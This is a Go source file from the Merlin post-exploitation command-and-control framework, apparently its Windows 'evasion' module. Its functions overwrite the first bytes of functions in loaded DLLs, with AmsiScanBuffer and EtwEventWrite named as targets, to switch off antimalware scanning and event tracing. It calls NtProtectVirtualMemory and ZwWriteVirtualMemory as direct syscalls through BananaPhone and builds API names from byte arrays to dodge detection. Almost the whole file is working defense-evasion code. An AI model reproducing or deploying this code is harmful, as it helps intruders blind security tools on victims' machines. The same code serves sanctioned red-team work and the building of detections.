//go:build amd64 && windows
// +build amd64,windows

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package evasion

import (
	// Standard
	"fmt"
	"syscall"
	"unsafe"

	// 3rd Party
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"

	// X-Packages
	"golang.org/x/sys/windows"
)

// Patch will find the target procedure and overwrite the start of its function with the provided bytes.
// Used to for evasion to patch things like amsi.dll!AmsiScanBuffer or ntdll.dll!EtwEvenWrite
func Patch(module string, proc string, data *[]byte) (string, error) {
	oldBytes, err := ReadBanana(module, proc, len(*data))
	if err != nil {
		return "", err
	}

	out := fmt.Sprintf("\nRead  %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)

	err = WriteBanana(module, proc, data)
	if err != nil {
		return out, err
	}

	out += fmt.Sprintf("\nWrote %d bytes to   %s!%s: %X", len(*data), module, proc, *data)

	oldBytes, err = ReadBanana(module, proc, len(*data))
	if err != nil {
		return out, err
	}

	out += fmt.Sprintf("\nRead  %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)

	return out, nil
}

// Read will find the target module and procedure address and then read its byteLength
func Read(module string, proc string, byteLength int) ([]byte, error) {
	target := syscall.NewLazyDLL(module).NewProc(proc)
	err := target.Find()
	if err != nil {
		return nil, err
	}

	data := make([]byte, byteLength)
	var readBytes *uintptr

	err = windows.ReadProcessMemory(windows.CurrentProcess(), target.Addr(), &data[0], uintptr(byteLength), readBytes)
	if err != nil {
		return data, err
	}
	return data, nil
}

// ReadBanana will find the target procedure and overwrite the start of its function with the provided bytes directly
// using the NtReadVirtualMemory syscall
func ReadBanana(module string, proc string, byteLength int) ([]byte, error) {
	target := syscall.NewLazyDLL(module).NewProc(proc)
	err := target.Find()
	if err != nil {
		return nil, err
	}
	data := make([]byte, byteLength)
	banana, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		return data, err
	}
	NtReadVirtualMemory, err := banana.GetSysID("NtReadVirtualMemory")
	if err != nil {
		return data, err
	}

	ret, err := bananaphone.Syscall(NtReadVirtualMemory, uintptr(0xffffffffffffffff), target.Addr(), uintptr(unsafe.Pointer(&data[0])), uintptr(byteLength), 0)
	if ret != 0 || err != nil {
		return data, fmt.Errorf("there was an error making the NtReadVirtualMemory syscall with a return of %d: %s", 0, err)
	}
	//fmt.Printf("Read  %v bytes from %s!%s: %X\n", byteLength, module, proc, data)
	return data, nil
}

// Write will find the target module and procedure and overwrite the start of the function with the provided bytes
func Write(module string, proc string, data *[]byte) error {
	target := syscall.NewLazyDLL(module).NewProc(proc)
	err := target.Find()
	if err != nil {
		return err
	}
	virtualProtect := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'})).NewProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't'}))

	var oldProtect uint32

	ret, _, err := virtualProtect.Call(uintptr(unsafe.Pointer(target)), uintptr(len(*data)), uintptr(uint32(windows.PAGE_EXECUTE_READWRITE)), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 || err != syscall.Errno(0) {
		return fmt.Errorf("there was an error calling Kernel32!VirtualProtect with return code %d: %s\n", ret, err)
	}

	var writeBytes *uintptr
	data2 := *data
	err = windows.WriteProcessMemory(windows.CurrentProcess(), target.Addr(), &data2[0], uintptr(len(*data)), writeBytes)
	if err != nil {
		return err
	}

	ret, _, err = virtualProtect.Call(uintptr(unsafe.Pointer(target)), uintptr(len(*data)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 || err != syscall.Errno(0) {
		return fmt.Errorf("there was an error calling Kernel32!VirtualProtect with return code %d: %s\n", ret, err)
	}
	return nil
}

// WriteBanana will find the target module and procedure and overwrite the start of the function with the provided bytes
// using the ZwWriteVirtualMemory syscall directly
func WriteBanana(module string, proc string, data *[]byte) error {
	target := syscall.NewLazyDLL(module).NewProc(proc)
	err := target.Find()
	if err != nil {
		return err
	}
	banana, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		return err
	}
	ZwWriteVirtualMemory, err := banana.GetSysID("ZwWriteVirtualMemory")
	if err != nil {
		return err
	}
	NtProtectVirtualMemory, err := banana.GetSysID("NtProtectVirtualMemory")
	if err != nil {
		return err
	}

	baseAddress := target.Addr()
	numberOfBytesToProtect := uintptr(len(*data))
	var oldProtect uint32

	// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html
	ret, err := bananaphone.Syscall(NtProtectVirtualMemory, uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&baseAddress)), uintptr(unsafe.Pointer(&numberOfBytesToProtect)), syscall.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if ret != 0 || err != nil {
		return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
	}

	// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html
	ret, err = bananaphone.Syscall(ZwWriteVirtualMemory, uintptr(0xffffffffffffffff), target.Addr(), uintptr(unsafe.Pointer(&[]byte(*data)[0])), unsafe.Sizeof(*data), 0)
	if ret != 0 || err != nil {
		return fmt.Errorf("there was an error making the ZwWriteVirtualMemory syscall with a return of %d: %s", 0, err)
	}

	ret, err = bananaphone.Syscall(NtProtectVirtualMemory, uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&baseAddress)), uintptr(unsafe.Pointer(&numberOfBytesToProtect)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if ret != 0 || err != nil {
		return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
	}
	//fmt.Printf("Wrote %d bytes from %s!%s: %X\n", len(*data), module, proc, *data)
	return nil
}
